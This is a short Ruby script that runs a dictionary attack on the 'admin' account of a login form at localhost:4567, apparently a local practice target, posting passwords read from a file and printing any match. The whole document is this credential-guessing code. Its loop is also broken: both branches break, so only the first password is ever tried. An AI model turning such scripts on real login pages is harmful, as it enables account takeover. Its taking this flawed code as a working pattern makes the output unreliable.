require 'net/http'

input = File.open('passwords.txt', 'r')
uri = URI('http://localhost:4567/login')
uri_2 = URI('http://localhost:4567/')

while (line = input.gets)
  password = line.chomp
  res = Net::HTTP.post_form(uri, username: 'admin', password: password).body
  if res.include? 'Wrong'
    puts res
    break
  else
    puts "Password found #{password} - line #{input.lineno}"
    puts Net::HTTP.get(uri_2)
    break
  end
end
# puts Net::HTTP.get(uri)
